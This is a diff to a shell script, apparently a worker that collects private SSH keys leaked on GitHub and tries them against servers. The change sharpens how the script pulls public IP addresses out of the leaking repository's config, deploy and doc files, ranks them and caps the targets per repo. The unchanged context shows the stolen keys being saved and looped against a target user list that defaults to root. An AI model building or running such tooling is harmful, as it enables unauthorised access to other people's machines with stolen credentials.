@@ -25,6 +25,7 @@ env_token="${GITHUB_TOKEN:-}"; env_config="${CONFIG_URL:-}"
 if [ -r "$SELF_DIR/worker.env" ]; then . "$SELF_DIR/worker.env"; fi
 TOKEN="${env_token:-${GITHUB_TOKEN:-}}"
 CONFIG_URL="${env_config:-${CONFIG_URL:-}}"
+HOSTS_PER_REPO="${HOSTS_PER_REPO:-5}"
 TARGET_USERS="${TARGET_USERS:-root}"
 MAX_REPOS="${HUNT_MAX_REPOS:-10}"
 TAB=$(printf '\t')
@@ -39,15 +40,34 @@ api() {
     fi
 }
 
-# IPs mentioned anywhere in the repo (the same repo that leaked the key).
+# Hosts = public addresses mentioned in the repo that leaked the key. Two passes:
+# config/deploy/doc files first (that is where real addresses actually live),
+# then the whole tree to top up the remainder. Order = how often it shows up.
+# The strict octet pattern rejects version strings such as 00.00.01.01.
+IP_RE='\b(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])){3}\b'
+IP_DROP='^(0\.|10\.|127\.|169\.254\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|255\.)'
+IP_NOISE='^(1\.1\.1\.1|8\.8\.4\.4|8\.8\.8\.8|9\.9\.9\.9|114\.114\.114\.114|223\.5\.5\.5)$'
+rank_ips() {
+    grep -vE "$IP_DROP" | grep -vE "$IP_NOISE" | sort | uniq -c | sort -rn | awk '{print $2}'
+}
+
 repo_hosts() {
     d="$WORK/tmp.$$"; rm -rf "$d"; mkdir -p "$d"
     if curl -fsSL "https://codeload.github.com/$1/tar.gz/HEAD" 2>/dev/null \
          | tar -xz -C "$d" 2>/dev/null; then
-        grep -rhoE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$d" 2>/dev/null \
-          | grep -vE '^(0\.|10\.|127\.|169\.254\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|255\.)' \
-          | grep -vE '^(8\.8\.8\.8|8\.8\.4\.4|1\.1\.1\.1|114\.114\.114\.114|223\.5\.5\.5)$' \
-          | sort -u | head -n 6
+        grep -rshoE "$IP_RE" \
+             --include='*.tf' --include='*.tfvars' --include='*.yml' --include='*.yaml' \
+             --include='*.conf' --include='*.cfg' --include='*.ini' --include='*.env' \
+             --include='*.properties' --include='*.sh' --include='*.md' --include='*.txt' \
+             --include='hosts' --include='Dockerfile*' --include='*compose*' \
+             "$d" 2>/dev/null | rank_ips > "$d/t1" || true
+        grep -rshoE "$IP_RE" "$d" 2>/dev/null | rank_ips > "$d/t2" || true
+        cat "$d/t1"
+        if [ -s "$d/t1" ]; then
+            grep -vxF -f "$d/t1" "$d/t2" 2>/dev/null || true
+        else
+            cat "$d/t2"
+        fi
     fi
     rm -rf "$d"
 }
@@ -88,7 +108,7 @@ harvest() {
         if grep -q 'ENCRYPTED' "$keyfile"; then rm -f "$keyfile"; continue; fi
         chmod 0600 "$keyfile"
 
-        hosts=$(repo_hosts "$repo")
+        hosts=$(repo_hosts "$repo" | head -n "$HOSTS_PER_REPO")
         [ -n "$hosts" ] || continue
         printf '%s\n' "$hosts" | while read -r h; do
             for u in $TARGET_USERS; do
